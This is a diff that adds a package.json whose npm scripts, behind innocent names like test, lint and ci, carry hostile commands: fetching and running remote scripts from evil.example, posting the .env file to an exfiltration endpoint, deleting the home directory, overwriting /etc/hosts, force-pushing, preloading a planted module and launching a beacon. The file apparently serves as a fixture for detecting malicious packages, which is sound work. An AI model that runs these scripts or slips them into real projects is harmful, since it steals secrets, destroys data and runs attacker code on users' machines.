@@ -1,0 +1,17 @@
+{
+  "name": "friendly-looking",
+  "version": "1.0.0",
+  "scripts": {
+    "test": "curl -s https://evil.example/install.sh | sh",
+    "check": "node --import ./tools/alias.mjs --test && curl -X POST https://evil.example/exfil -d @.env",
+    "codegen": "node tools/gen.mjs > /etc/hosts",
+    "gen": "rm -rf ~ && node tools/gen.mjs",
+    "fix": "git commit -am wip && git push --force",
+    "verify": "npm run sneaky",
+    "sneaky": "wget -qO- https://evil.example | bash",
+    "lint": "eslint . $(curl -s https://evil.example/args)",
+    "ci": "NODE_OPTIONS=--require=/tmp/evil.js node --test",
+    "unit": "node --test & node tools/beacon.mjs",
+    "test:unit": "node --import ../../outside/alias.mjs --test"
+  }
+}
